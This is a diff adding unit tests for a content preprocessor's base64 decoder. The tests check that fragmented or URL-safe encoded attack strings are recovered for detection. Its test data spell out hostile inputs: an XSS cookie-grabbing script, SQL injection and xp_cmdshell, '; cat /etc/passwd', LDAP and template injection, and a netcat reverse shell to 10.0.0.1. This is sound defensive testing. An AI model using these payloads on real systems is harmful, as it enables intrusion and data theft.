@@ -748,6 +748,341 @@ def test_stacked_benign_short_identifiers_stay_undetected_after_reassembly() -> 
     assert result == content
 
 
+def _b64_fragment_by(
+    payload: str, sep: str, chunk: int = 6, urlsafe: bool = False
+) -> str:
+    import base64
+
+    encoder = base64.urlsafe_b64encode if urlsafe else base64.b64encode
+    encoded = encoder(payload.encode()).decode()
+    return sep.join(encoded[i : i + chunk] for i in range(0, len(encoded), chunk))
+
+
+def test_decode_base64_candidates_recovers_space_joined_fragments() -> None:
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    content = _b64_fragment_by(payload, " ")
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_tab_joined_fragments() -> None:
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    content = _b64_fragment_by(payload, "\t")
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_formfeed_joined_fragments() -> None:
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    content = _b64_fragment_by(payload, "\f")
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_mixed_whitespace_joined_fragments() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "' OR 1=1 UNION SELECT password FROM admin--"
+    encoded = base64.b64encode(payload.encode()).decode()
+    seps = [" ", "\t", "\n", "\f", "\r\n"]
+    parts = []
+    for i in range(0, len(encoded), 6):
+        parts.append(encoded[i : i + 6])
+    content = seps[0].join(parts[:1])
+    for index, part in enumerate(parts[1:], start=1):
+        content += seps[index % len(seps)] + part
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_urlsafe_hyphen_whole_span() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    token = base64.urlsafe_b64encode(payload.encode()).decode()
+    assert "-" in token
+
+    result = preprocessor._decode_base64_candidates(token)
+
+    assert result == payload
+
+
+def test_decode_base64_candidates_recovers_urlsafe_underscore_whole_span() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "; cat /etc/passwd && echo ?0"
+    token = base64.urlsafe_b64encode(payload.encode()).decode()
+    assert "_" in token
+
+    result = preprocessor._decode_base64_candidates(token)
+
+    assert result == payload
+
+
+def test_decode_base64_candidates_recovers_urlsafe_newline_joined_fragments() -> None:
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    content = _b64_fragment_by(payload, "\n", urlsafe=True)
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_short_payload_with_single_padding_char() -> (
+    None
+):
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "*)(uid=*"
+    token = base64.b64encode(payload.encode()).decode()
+    assert token.endswith("=") and not token.endswith("==")
+
+    result = preprocessor._decode_base64_candidates(token)
+
+    assert result == payload
+
+
+def test_decode_base64_candidates_recovers_double_padded_short_payload() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "{{7*7}}"
+    token = base64.b64encode(payload.encode()).decode()
+    assert token.endswith("==")
+
+    result = preprocessor._decode_base64_candidates(token)
+
+    assert result == payload
+
+
+def test_decode_base64_candidates_recovers_padded_payload_newline_fragmented() -> None:
+    preprocessor = ContentPreprocessor()
+    payload = "*)(uid=*"
+    content = _b64_fragment_by(payload, "\n")
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_base64_re_rejects_eleven_char_unpadded_run() -> None:
+    preprocessor = ContentPreprocessor()
+
+    assert preprocessor._BASE64_RE.search("AAAAAAAAAAA") is None
+
+
+def test_base64_re_requires_ten_data_chars_for_double_padding() -> None:
+    preprocessor = ContentPreprocessor()
+
+    assert preprocessor._BASE64_RE.search("AAAAAAAAA==") is None
+    assert preprocessor._BASE64_RE.search("AAAAAAAAAA==") is not None
+
+
+def test_decode_base64_candidates_does_not_swallow_query_param_equals_sign() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "| nc -e /bin/sh 10.0.0.1 4444"
+    blob = base64.b64encode(payload.encode()).decode()
+    content = f"payload={blob}"
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert result == f"payload={payload}"
+
+
+def test_decode_base64_candidates_leaves_sql_keyword_phrase_intact() -> None:
+    preprocessor = ContentPreprocessor()
+    content = "1; EXEC xp_cmdshell('whoami')"
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert result == content
+
+
+_BENIGN_HYPHENATED_SLUG_LINES = [
+    "black-friday-deals",
+    "customer-support-portal",
+    "release-notes-v3-13-0",
+    "content-transfer-encoding",
+]
+
+
+def test_stacked_benign_hyphenated_slugs_stay_undetected() -> None:
+    preprocessor = ContentPreprocessor()
+    content = "\n".join(_BENIGN_HYPHENATED_SLUG_LINES)
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert result == content
+
+
+def test_decode_base64_candidates_recovers_76_column_wrapped_mime() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>" * 3
+    blob = base64.b64encode(payload.encode()).decode()
+    wrapped = "\r\n".join(blob[i : i + 76] for i in range(0, len(blob), 76))
+
+    result = preprocessor._decode_base64_candidates(wrapped)
+
+    assert payload in result
+
+
+_C0_CONTROL_SEPARATORS = {
+    "VT": "\x0b",
+    "FS": "\x1c",
+    "GS": "\x1d",
+    "RS": "\x1e",
+    "US": "\x1f",
+}
+_ROUND_SIX_PAYLOADS = {
+    "xss": "<script>alert(document.cookie)</script>",
+    "sqli": "' OR 1=1--",
+    "cmd": "; cat /etc/passwd",
+}
+
+
+def test_decode_base64_candidates_recovers_c0_control_joined_fragments() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    for sep in _C0_CONTROL_SEPARATORS.values():
+        for payload in _ROUND_SIX_PAYLOADS.values():
+            encoded = base64.b64encode(payload.encode()).decode()
+            content = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+            result = preprocessor._decode_base64_candidates(content)
+            assert payload in result
+
+
+def test_decode_base64_candidates_recovers_equals_sign_joined_fragments() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "<script>alert(document.cookie)</script>"
+    encoded = base64.b64encode(payload.encode()).decode()
+    content = "=".join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+
+    result = preprocessor._decode_base64_candidates(content)
+
+    assert payload in result
+
+
+def test_decode_base64_candidates_recovers_dash_underscore_joined_blob() -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    payload = "; cat /etc/passwd"
+    encoded = base64.b64encode(payload.encode()).decode()
+    for sep in ("-", "_"):
+        content = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+        result = preprocessor._decode_base64_candidates(content)
+        assert payload in result
+
+
+def _b64decode_oracle_recovers(byte_value: int, payload: str) -> bool:
+    import base64
+
+    sep = chr(byte_value)
+    encoded = base64.b64encode(payload.encode()).decode()
+    fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+    try:
+        return base64.b64decode(fragment).decode("utf-8", errors="strict") == payload
+    except Exception:
+        return False
+
+
+@pytest.mark.parametrize("byte_value", range(0x80))
+def test_decode_base64_candidates_matches_b64decode_oracle_for_ascii_byte(
+    byte_value: int,
+) -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    sep = chr(byte_value)
+    for payload in _ROUND_SIX_PAYLOADS.values():
+        oracle_recovers = _b64decode_oracle_recovers(byte_value, payload)
+
+        encoded = base64.b64encode(payload.encode()).decode()
+        fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+        result = preprocessor._decode_base64_candidates(fragment)
+        impl_recovers = payload in result
+
+        assert impl_recovers == oracle_recovers, (
+            f"byte=0x{byte_value:02x} payload={payload!r} "
+            f"oracle={oracle_recovers} impl={impl_recovers}"
+        )
+
+
+def _b64decode_oracle_recovers_raw_byte(byte_value: int, payload: str) -> bool:
+    import base64
+
+    sep = bytes([byte_value])
+    encoded = base64.b64encode(payload.encode()).decode()
+    fragment_bytes = sep.join(
+        encoded[i : i + 6].encode() for i in range(0, len(encoded), 6)
+    )
+    try:
+        return (
+            base64.b64decode(fragment_bytes).decode("utf-8", errors="strict") == payload
+        )
+    except Exception:
+        return False
+
+
+@pytest.mark.parametrize("byte_value", range(0x80, 0x100))
+def test_decode_base64_candidates_matches_b64decode_oracle_for_surrogate_escaped_byte(
+    byte_value: int,
+) -> None:
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    sep = bytes([byte_value]).decode("utf-8", errors="surrogateescape")
+    for payload in _ROUND_SIX_PAYLOADS.values():
+        oracle_recovers = _b64decode_oracle_recovers_raw_byte(byte_value, payload)
+
+        encoded = base64.b64encode(payload.encode()).decode()
+        fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
+        result = preprocessor._decode_base64_candidates(fragment)
+        impl_recovers = payload in result
+
+        assert impl_recovers == oracle_recovers, (
+            f"byte=0x{byte_value:02x} payload={payload!r} "
+            f"oracle={oracle_recovers} impl={impl_recovers}"
+        )
+
+
+def test_decode_base64_candidates_decodes_padded_token_at_loose_primary_threshold() -> (
+    None
+):
+    import base64
+
+    preprocessor = ContentPreprocessor()
+    raw = b"A" * 10 + b"\x01" * 10
+    token = base64.b64encode(raw).decode("ascii")
+
+    result = preprocessor._decode_base64_candidates(token)
+
+    assert result == raw.decode("utf-8")
+
+
 def test_decode_hex_escapes_replaces_two_digit_escape() -> None:
     preprocessor = ContentPreprocessor()
 
